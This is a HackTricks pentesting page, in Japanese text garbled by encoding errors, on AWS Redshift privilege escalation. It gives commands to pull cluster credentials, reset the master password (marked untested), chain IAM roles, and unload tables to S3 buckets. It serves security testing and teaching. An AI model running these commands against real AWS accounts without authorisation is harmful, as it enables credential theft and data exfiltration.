# AWS - Redshift Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Redshift

RDSã«ã¤ã„ã¦ã®è©³ç´°ã¯ä»¥ä¸‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„:

{% content-ref url="../aws-services/aws-redshift-enum.md" %}
[aws-redshift-enum.md](../aws-services/aws-redshift-enum.md)
{% endcontent-ref %}

### `redshift:DescribeClusters`, `redshift:GetClusterCredentials`

ã“ã‚Œã‚‰ã®æ¨©é™ãŒã‚ã‚Œã°ã€**ã™ã¹ã¦ã®ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®æƒ…å ±**ï¼ˆåå‰ã‚„ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’å«ã‚€ï¼‰ã‚’å–å¾—ã—ã€ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®**è³‡æ ¼æƒ…å ±ã‚’å–å¾—**ã§ãã¾ã™:
```bash
# Get creds
aws redshift get-cluster-credentials --db-user postgres --cluster-identifier redshift-cluster-1
# Connect, even if the password is a base64 string, that is the password
psql -h redshift-cluster-1.asdjuezc439a.us-east-1.redshift.amazonaws.com -U "IAM:<username>" -d template1 -p 5439
```
**æ½œåœ¨çš„å½±éŸ¿:** ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã®æ©Ÿå¯†æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã€‚

### `redshift:DescribeClusters`, `redshift:GetClusterCredentialsWithIAM`

ã“ã‚Œã‚‰ã®æ¨©é™ãŒã‚ã‚Œã°ã€**ã™ã¹ã¦ã®ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®æƒ…å ±**ã‚’å–å¾—ã—ã€**ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®è³‡æ ¼æƒ…å ±**ã‚’å–å¾—ã§ãã¾ã™ã€‚\
postgresãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€è³‡æ ¼æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚ŒãŸ**IAMã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãŒæŒã¤æ¨©é™**ã‚’æŒã¤ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
```bash
# Get creds
aws redshift get-cluster-credentials-with-iam --cluster-identifier redshift-cluster-1
# Connect, even if the password is a base64 string, that is the password
psql -h redshift-cluster-1.asdjuezc439a.us-east-1.redshift.amazonaws.com -U "IAMR:AWSReservedSSO_AdministratorAccess_4601154638985c45" -d template1 -p 5439
```
**æ½œåœ¨çš„å½±éŸ¿:** ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã®æ©Ÿå¯†æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã€‚

### `redshift:DescribeClusters`, `redshift:ModifyCluster?`

aws cliã‹ã‚‰å†…éƒ¨postgres (redshift) ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**ãƒã‚¹ã‚¿ãƒ¼ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´**ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ (ã“ã‚Œã‚‰ã®æ¨©é™ãŒå¿…è¦ã ã¨æ€ã„ã¾ã™ãŒã€ã¾ã ãƒ†ã‚¹ãƒˆã—ã¦ã„ã¾ã›ã‚“):
```
aws redshift modify-cluster â€“cluster-identifier <identifier-for-the cluster> â€“master-user-password â€˜master-passwordâ€™;
```
**æ½œåœ¨çš„å½±éŸ¿:** ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã®æ©Ÿå¯†æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã€‚

## å¤–éƒ¨ã‚µãƒ¼ãƒ“ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

{% hint style="warning" %}
ä»¥ä¸‹ã®ã™ã¹ã¦ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã«ã¯ã€**ä½¿ç”¨ã™ã‚‹ãƒ­ãƒ¼ãƒ«ã‚’æŒ‡å®šã™ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚Redshiftã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã«ã¯ã€**ä½¿ç”¨ã§ãã‚‹AWSãƒ­ãƒ¼ãƒ«ã®ãƒªã‚¹ãƒˆãŒå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¦ã„ã‚‹**å ´åˆãŒã‚ã‚Šã€**ARNã‚’çŸ¥ã£ã¦ã„ã‚Œã°**ãã‚Œã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã¯ã€å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ­ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ãŸã‚ã«ã€Œ**default**ã€ã‚’è¨­å®šã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

ã•ã‚‰ã«ã€[**ã“ã“ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«**](https://docs.aws.amazon.com/redshift/latest/mgmt/authorizing-redshift-service.html)ã€Redshiftã¯ãƒ­ãƒ¼ãƒ«ã‚’é€£çµã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼ˆæœ€åˆã®ãƒ­ãƒ¼ãƒ«ãŒ2ç•ªç›®ã®ãƒ­ãƒ¼ãƒ«ã‚’å¼•ãå—ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹é™ã‚Šï¼‰ã®ã§ã€**ã‚«ãƒ³ãƒ**ã§åŒºåˆ‡ã‚‹ã ã‘ã§ã•ã‚‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™: `iam_role 'arn:aws:iam::123456789012:role/RoleA,arn:aws:iam::210987654321:role/RoleB';`
{% endhint %}

### Lambdas

[https://docs.aws.amazon.com/redshift/latest/dg/r\_CREATE\_EXTERNAL\_FUNCTION.html](https://docs.aws.amazon.com/redshift/latest/dg/r\_CREATE\_EXTERNAL\_FUNCTION.html)ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€Redshiftã‹ã‚‰lambdaé–¢æ•°ã‚’**å‘¼ã³å‡ºã™ã“ã¨ãŒå¯èƒ½**ã§ã™ã€‚ä¾‹ãˆã°æ¬¡ã®ã‚ˆã†ã«:
```sql
CREATE EXTERNAL FUNCTION exfunc_sum2(INT,INT)
RETURNS INT
STABLE
LAMBDA 'lambda_function'
IAM_ROLE default;
```
### S3

[https://docs.aws.amazon.com/redshift/latest/dg/tutorial-loading-run-copy.html](https://docs.aws.amazon.com/redshift/latest/dg/tutorial-loading-run-copy.html)ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€**S3ãƒã‚±ãƒƒãƒˆã«èª­ã¿æ›¸ãã™ã‚‹**ã“ã¨ãŒå¯èƒ½ã§ã™:
```sql
# Read
copy table from 's3://<your-bucket-name>/load/key_prefix'
credentials 'aws_iam_role=arn:aws:iam::<aws-account-id>:role/<role-name>'
region '<region>'
options;

# Write
unload ('select * from venue')
to 's3://mybucket/tickit/unload/venue_'
iam_role default;
```
### Dynamo

[https://docs.aws.amazon.com/redshift/latest/dg/t\_Loading-data-from-dynamodb.html](https://docs.aws.amazon.com/redshift/latest/dg/t\_Loading-data-from-dynamodb.html)ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€**dynamodbã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—ã™ã‚‹**ã“ã¨ãŒå¯èƒ½ã§ã™:
```sql
copy favoritemovies
from 'dynamodb://ProductCatalog'
iam_role 'arn:aws:iam::0123456789012:role/MyRedshiftRole';
```
{% hint style="warning" %}
Amazon DynamoDBãƒ†ãƒ¼ãƒ–ãƒ«ãŒãƒ‡ãƒ¼ã‚¿ã‚’æä¾›ã™ã‚‹å ´åˆã€Amazon DynamoDBãƒ†ãƒ¼ãƒ–ãƒ«ãŒé…ç½®ã•ã‚Œã¦ã„ã‚‹AWSãƒªãƒ¼ã‚¸ãƒ§ãƒ³ã‚’æŒ‡å®šã™ã‚‹[REGION](https://docs.aws.amazon.com/redshift/latest/dg/copy-parameters-data-source-s3.html#copy-region)ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ãªã„é™ã‚Šã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã¨åŒã˜AWSãƒªãƒ¼ã‚¸ãƒ§ãƒ³ã«ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

### EMR

[https://docs.aws.amazon.com/redshift/latest/dg/loading-data-from-emr.html](https://docs.aws.amazon.com/redshift/latest/dg/loading-data-from-emr.html)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

## References

* [https://gist.github.com/kmcquade/33860a617e651104d243c324ddf7992a](https://gist.github.com/kmcquade/33860a617e651104d243c324ddf7992a)

{% hint style="success" %}
AWS Hackingã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hackingã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **PRã‚’æå‡ºã—ã¦** [**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã§ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
